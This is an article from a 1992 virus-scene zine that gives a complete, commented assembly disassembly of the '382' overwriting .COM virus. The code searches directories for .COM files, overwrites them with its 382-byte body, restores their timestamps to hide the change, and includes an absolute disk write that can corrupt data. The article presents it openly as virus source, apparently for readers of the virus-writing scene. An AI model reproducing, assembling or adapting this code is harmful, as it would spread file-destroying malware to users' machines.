ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #2 - YAM '92

Article Title: 382 Virus
Author: Admiral Bailey


;=---
;
; 382 Virus (Family-Q as McAfee 91 calls it)
;
; Disassembled By Admiral Bailey [YAM '92]
; June 25, 1992
;
; The writer of this is unknown to me... maybe you should put some of
; your info in it.
;
; Notes:This virus I found on a board and got right to it.  It wasnt
;       too hard to disassemble since there was no encryption.  Its an
;       .com over writing virus.  Yes there is ????????exe inside the
;       file but I don't know what the hell that is.  If you run it it
;       only overwrits the com files.  It probably get exe files if no
;       com files are found.  But anyways there seems to be a bug in
;       the original virus.  Put it in a directory and run it it will
;       display crap and crash the computer.  With out doing any
;       damage.  If you want any more info check it out for yourself.
;       All i did this time was comment it.. cuz i found this to be a
;       boring run of the mill virus.  Anyways here it is.
;
;=---------

PAGE  59,132                                    ; I gotta check out
                                                ; what this means...

data_1e         equ     9Eh
data_15e        equ     0E000h
data_17e        equ     0E17Eh

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h

382             proc    far

start:
                jmp     short $+2               ; just there to confuse
                mov     cs:data_4,0             ; actually jumps to here
                mov     ah,19h                  ; get default drive
                int     21h
                mov     cs:data_11,al           ; save default drive
                mov     ah,47h                  ; get present dir of
                mov     dl,0                    ;   current drive
                lea     si,data_13              ; holds directory name
                int     21h
                clc
loc_1:
                jnc     loc_2                   ; if no error then jump
                mov     ah,17h                  ; rename file
                lea     dx,data_7               ; Load effective addr
                int     21h
                cmp     al,0FFh                 ; is there an error?
                jne     loc_2                   ; no then jump
                mov     ah,2Ch                  ; get current time
                int     21h

                mov     al,cs:data_11           ; drive
                mov     bx,dx                   ; buffer
                mov     cx,2                    ; # of sectors
                mov     dh,0                    ; parm block
                int     26h                     ; Absolute disk write
                jmp     loc_9

loc_2:
                mov     ah,3Bh                  ; set the current
                lea     dx,data_10              ; directory
                int     21h

                jmp     short loc_6
loc_3:
                mov     ah,17h                  ; rename file
                lea     dx,data_7
                int     21h

                mov     ah,3Bh                  ; set current directory
                lea     dx,data_10
                int     21h

                mov     ah,4Eh                  ; find first file
                mov     cx,11h
                lea     dx,data_6               ; file type
                int     21h

                jc      loc_1                   ; Jump if carry Set
                mov     bx,cs:data_4            ; put value in bx
                inc     bx                      ; check to see if it is
                dec     bx                      ; zero
                jz      loc_5
loc_4:
                mov     ah,4Fh                  ; find next file
                int     21h

                jc      loc_1                   ; none found then jump
                dec     bx
                jnz     loc_4                   ; Jump if not zero
loc_5:
                mov     ah,2Fh                  ; get dta
                int     21h                     

                add     bx,1Ch
                mov     word ptr es:[bx],5C20h
                inc     bx
                push    ds                      ; save ds
                mov     ax,es                   ; putting es into ds
                mov     ds,ax
                mov     dx,bx
                mov     ah,3Bh                  ; get current dir
                int     21h                     

                pop     ds                      ; get old ds
                mov     bx,cs:data_4
                inc     bx
                mov     cs:data_4,bx
loc_6:
                mov     ah,4Eh                  ; find first file
                mov     cx,1
                lea     dx,data_5               ; type to find
                int     21h                     

                jc      loc_3                   ; none found then jump
                jmp     short loc_8
loc_7:
                mov     ah,4Fh                  ; find next file
                int     21h
                                                
                jc      loc_3                   ; none found then jump
loc_8:
                mov     ah,3Dh                  ; open file
                mov     al,0
                mov     dx,data_1e
                int     21h
                                                
                mov     bx,ax                   ; file name in bx
                mov     ah,3Fh                  ; read file
                mov     cx,17Eh                 ; number of bytes
                nop
                mov     dx,data_15e             ; buffer to hold the
                nop                             ; bytes
                int     21h                     

                mov     ah,3Eh                  ; close the file
                int     21h                     

                mov     bx,cs:data_15e
                cmp     bx,0EBh
                je      loc_7
                mov     ah,43h                  ; get attrib
                mov     al,0
                mov     dx,data_1e              ; filename
                int     21h

                mov     ah,43h                  ; set attrib
                mov     al,1
                and     cx,0FEh
                int     21h

                mov     ah,3Dh                  ; open up the file
                mov     al,2
                mov     dx,data_1e              ; filename
                int     21h                     
                                                
                mov     bx,ax                   ; filename
                mov     ah,57h                  ; get files date and
                mov     al,0                    ; time
                int     21h

                push    cx                      ; save time
                push    dx
                mov     dx,word ptr cs:[23Ch]
                mov     cs:data_17e,dx
                mov     dx,word ptr cs:data_15e+1
                lea     cx,cs:[13Bh]
                sub     dx,cx
                mov     word ptr cs:[23Ch],dx
                mov     ah,40h                  ; write to file
                mov     cx,17Eh                 ; size of virus [382]
                nop
                lea     dx,ds:[100h]            ; Load effective addr
                int     21h                     
                                                
                mov     ah,57h                  ; set files time+date
                mov     al,1
                pop     dx                      ; get old date+time
                pop     cx
                int     21h                     

                mov     ah,3Eh                  ; close up the file
                int     21h

                mov     dx,cs:data_17e
                mov     word ptr cs:[23Ch],dx
loc_9:
                call    sub_1
                jmp     $-3618h
                db      0B4h, 4Ch,0CDh, 21h     ; bytes to quit
                                                ; mov ax,4c00h
                                                ; int 21

382             endp

sub_1           proc    near
                mov     ah,3Bh                  ; set current dir
                lea     dx,data_12              ; holds current
                int     21h                     ; directory
                retn
sub_1           endp

data_4          dw      0
data_5          db      2Ah
                db       2Eh, 63h, 6Fh, 6Dh, 00h
data_6          db      2Ah
                db      0
data_7          db      0FFh
                db       00h, 00h, 00h, 00h, 00h, 3Fh
                db       00h
                db      3Fh
                db      7 dup (3Fh)
                db       65h, 78h, 65h, 00h, 00h, 00h
                db       00h, 00h
                db      3Fh
                db      7 dup (3Fh)
                db       63h, 6Fh, 6Dh, 00h
data_10         db      5Ch
                db      0
data_11         db      4
data_12         db      5Ch
data_13         db      0

seg_a           ends



                end     start


